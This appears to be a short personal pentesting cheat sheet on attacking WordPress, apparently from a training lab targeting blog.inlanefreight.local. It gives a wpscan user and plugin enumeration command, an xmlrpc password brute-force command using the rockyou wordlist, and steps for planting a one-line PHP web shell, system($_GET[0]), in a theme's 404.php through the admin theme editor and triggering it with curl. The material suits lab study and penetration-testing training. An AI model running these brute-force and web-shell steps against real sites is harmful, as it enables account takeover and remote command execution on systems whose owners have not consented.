
wpscan
```
wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate u,vp --plugins-detection aggressive
```

Plugins stored in wp-content/plugins. These stored in wp-content/themes

Valid Username but invalid password
![[Pasted image 20260413145117.png]]
Invalid Username
![[Pasted image 20260413145128.png]]

Brute Force Login
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Code Execution
Admin Panel > Appearance > Theme Editor > Twenty Nineteen Then click select and edit page 404.php
```
system($_GET[0])
```
- Add this line just below the comments 
Click update file and navigate to it 
```
/wp-content/themes/<theme name>
```
or 
```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

